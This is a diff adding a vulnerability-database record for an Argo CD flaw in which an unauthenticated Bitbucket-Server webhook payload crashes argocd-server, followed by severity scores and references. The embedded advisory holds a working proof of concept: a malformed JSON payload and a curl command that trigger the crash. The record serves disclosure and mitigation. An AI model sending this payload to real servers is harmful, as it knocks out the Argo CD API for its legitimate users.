@@ -1,0 +1,242 @@
+vulnerability_id: VCID-zsuz-zfsk-97bb
+aliases:
+  - CVE-2025-59531
+  - GHSA-f9gq-prrc-hrhc
+summary: "Unauthenticated argocd-server panic via a malicious Bitbucket-Server webhook payload\n\
+  ### Summary\n\nUnpatched Argo CD versions are vulnerable to malicious API requests which can\
+  \ crash the API server and cause denial of service to legitimate clients. \n\nWith the default\
+  \ configuration, no `webhook.bitbucketserver.secret` set, Argo CD’s /api/webhook endpoint\
+  \ will crash the entire argocd-server process when it receives a Bitbucket-Server push event\
+  \ whose JSON field `repository.links.clone` is anything other than an array.\n\nA single unauthenticated\
+  \ curl request can push the control-plane into CrashLoopBackOff; repeating the request on\
+  \ each replica causes a complete outage of the API.\n\n### Details\n```go\n// webhook.go (Bitbucket-Server\
+  \ branch in affectedRevisionInfo)\n\nfor _, l := range payload.Repository.Links[\"clone\"\
+  ].([]any) {   // <- unsafe cast\n    link := l.(map[string]any)\n    ...\n}\n```\n\nIf links.clone\
+  \ is a string, number, object, or null, the first type assertion panics:\ninterface conversion:\
+  \ interface {} is string, not []interface {}\n\nThe worker goroutine created by startWorkerPool\
+  \ lacks a recover, so the panic terminates the whole binary.\n\n### PoC\n\nSave as payload-panic.json\
+  \ - note the non-array links.clone.\n\n```json\n{\n  \"eventKey\": \"repo:refs_changed\",\n\
+  \  \"repository\": {\n    \"name\": \"guestbook\",\n    \"fullName\": \"APP/guestbook\",\n\
+  \    \"links\": { \"clone\": \"boom\" }\n  },\n  \"changes\": [ { \"ref\": { \"id\": \"refs/heads/master\"\
+  \ } } ]\n}\n```\n\n```shell\ncurl -k -X POST https://argocd.example.com/api/webhook \\\n \
+  \    -H 'X-Event-Key: repo:refs_changed' \\\n     -H 'Content-Type: application/json' \\\n\
+  \     --data-binary @payload-panic.json\n```\n\nObserved crash (argocd-server restart):\n\n\
+  ```\npanic: interface conversion: interface {} is string, not []interface {}\ngoroutine 192\
+  \ [running]:\ngithub.com/argoproj/argo-cd/v3/server/webhook.affectedRevisionInfo\n    webhook.go:209\
+  \ +0x1218\n...\n```\n\n### Mitigation\n\nIf you use Bitbucket Server and need to handle webhook\
+  \ events, configure a webhook secret to ensure only trusted parties can invoke the webhook\
+  \ handler.\n\nIf you do not use Bitbucket Server, you can set the webhook secret to a long,\
+  \ random value to effectively disable webhook handling for Bitbucket Server payloads.\n\n\
+  ```diff\napiVersion: v1\nkind: Secret\nmetadata:\n  name: argocd-secret\ntype: Opaque\ndata:\n\
+  +  webhook.bitbucketserver.secret: <your base64-encoded secret here>\n```\n\n### For more\
+  \ information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues)\
+  \ or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack)\
+  \ in channel #argo-cd\n\n### Credits\n\nDiscovered by Jakub Ciolek at AlphaSense."
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-59531.json
+  - score: '0.0004'
+    scoring_system: epss
+    scoring_elements: '0.11672'
+    published_at: '2025-10-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.0004'
+    scoring_system: epss
+    scoring_elements: '0.11709'
+    published_at: '2025-10-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.0004'
+    scoring_system: epss
+    scoring_elements: '0.11644'
+    published_at: '2025-10-06 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00052'
+    scoring_system: epss
+    scoring_elements: '0.16114'
+    published_at: '2025-10-07 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17307'
+    published_at: '2025-10-23 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17196'
+    published_at: '2025-10-20 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17261'
+    published_at: '2025-10-19 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17296'
+    published_at: '2025-10-17 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17275'
+    published_at: '2025-10-30 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17272'
+    published_at: '2025-10-29 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17268'
+    published_at: '2025-10-28 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17305'
+    published_at: '2025-10-25 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17312'
+    published_at: '2025-10-16 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17292'
+    published_at: '2025-10-24 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17236'
+    published_at: '2025-10-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17229'
+    published_at: '2025-10-13 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00055'
+    scoring_system: epss
+    scoring_elements: '0.17293'
+    published_at: '2025-10-15 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.0006'
+    scoring_system: epss
+    scoring_elements: '0.18939'
+    published_at: '2025-11-02 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.0006'
+    scoring_system: epss
+    scoring_elements: '0.18888'
+    published_at: '2025-11-03 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00085'
+    scoring_system: epss
+    scoring_elements: '0.25057'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '0.00085'
+    scoring_system: epss
+    scoring_elements: '0.25129'
+    published_at: '2026-01-08 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/argoproj/argo-cd
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/argoproj/argo-cd
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/argoproj/argo-cd/commit/5c466a4e39802e059e75c0008ae7b7b8e842538f
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/argoproj/argo-cd/commit/5c466a4e39802e059e75c0008ae7b7b8e842538f
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2025-10-02T15:35:32Z/
+    published_at: None
+    url: https://github.com/argoproj/argo-cd/commit/5c466a4e39802e059e75c0008ae7b7b8e842538f
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://github.com/argoproj/argo-cd/security/advisories/GHSA-f9gq-prrc-hrhc
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/argoproj/argo-cd/security/advisories/GHSA-f9gq-prrc-hrhc
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:Y/T:P/P:M/B:A/M:M/D:T/2025-10-02T15:35:32Z/
+    published_at: None
+    url: https://github.com/argoproj/argo-cd/security/advisories/GHSA-f9gq-prrc-hrhc
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-59531
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2025-59531
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    published_at: None
+    url: https://pkg.go.dev/vuln/GO-2025-3993
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://pkg.go.dev/vuln/GO-2025-3993
+weaknesses:
+  - CWE-703
+  - CWE-248
+references:
+  - url: https://access.redhat.com/hydra/rest/securitydata/cve/CVE-2025-59531.json
+    reference_type:
+    reference_id:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2025-59531
+    reference_type:
+    reference_id:
+  - url: https://github.com/argoproj/argo-cd
+    reference_type:
+    reference_id:
+  - url: https://github.com/argoproj/argo-cd/commit/5c466a4e39802e059e75c0008ae7b7b8e842538f
+    reference_type:
+    reference_id:
+  - url: https://github.com/argoproj/argo-cd/security/advisories/GHSA-f9gq-prrc-hrhc
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-59531
+    reference_type:
+    reference_id:
+  - url: https://pkg.go.dev/vuln/GO-2025-3993
+    reference_type:
+    reference_id:
+  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2400935
+    reference_type:
+    reference_id: 2400935
+  - url: https://access.redhat.com/errata/RHSA-2025:17730
+    reference_type:
+    reference_id: RHSA-2025:17730
+  - url: https://access.redhat.com/errata/RHSA-2025:17731
+    reference_type:
+    reference_id: RHSA-2025:17731
+  - url: https://access.redhat.com/errata/RHSA-2025:18093
+    reference_type:
+    reference_id: RHSA-2025:18093
